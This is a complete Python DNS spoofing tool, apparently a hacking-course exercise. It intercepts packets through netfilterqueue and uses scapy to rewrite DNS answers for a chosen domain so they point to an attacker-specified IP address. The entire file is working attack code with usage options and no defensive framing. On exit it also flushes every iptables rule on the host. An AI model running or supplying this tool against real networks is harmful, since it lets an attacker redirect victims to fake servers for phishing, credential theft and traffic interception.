#!/usr/bin/env python3

import subprocess
import netfilterqueue
import scapy.all as scapy
from optparse import OptionParser


def get_argument():
    parser = OptionParser()
    parser.add_option("--host", dest="host_machine", help="Specify the IP address for your fake DNS server. "
                                                          "Example: --host 192.168.152.134")
    parser.add_option("--queue-num", dest="queue_num",
                      help="Specify the queue number to trap the sniffed packets."
                           "Example: --queue-num 7")
    parser.add_option("-d", "--domain", dest="domain_name",
                      help="Specify the domain name that you want to spoof its IP."
                           "Example: --domain www.bing.com")

    (options, arguments) = parser.parse_args()
    if not options.host_machine:
        parser.error("[-] Please specify the IP address for your fake DNS server, or type it correctly, "
                     "ex: --host 192.168.152.134")
    elif not options.queue_num:
        parser.error("[-] Please specify the queue number to trap the sniffed packets., or type it correctly, "
                     "ex: --queue-num 7")
    elif not options.domain_name:
        parser.error("[-] Please specify the domain name that you want to spoof its IP., or type it correctly, "
                     "ex: --domain www.bing.com")

    return options


option = get_argument()

host_ip = option.host_machine
domain = option.domain_name
queue_number = int(option.queue_num)


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname_field = scapy_packet[scapy.DNSQR].qname
        if domain.encode('utf-8') in qname_field:
            answer = scapy.DNSRR(rrname=qname_field, rdata=host_ip.encode('utf-8'))
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
            print('')
            print("\r[+] DNS Spoofing Target", end='')

    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(queue_num=queue_number, user_callback=process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[*] Detected 'ctrl + c' pressed, program terminated.")
    print("[*] flushing iptables rules... please wait.\n")
    subprocess.call(["iptables", "--flush"])
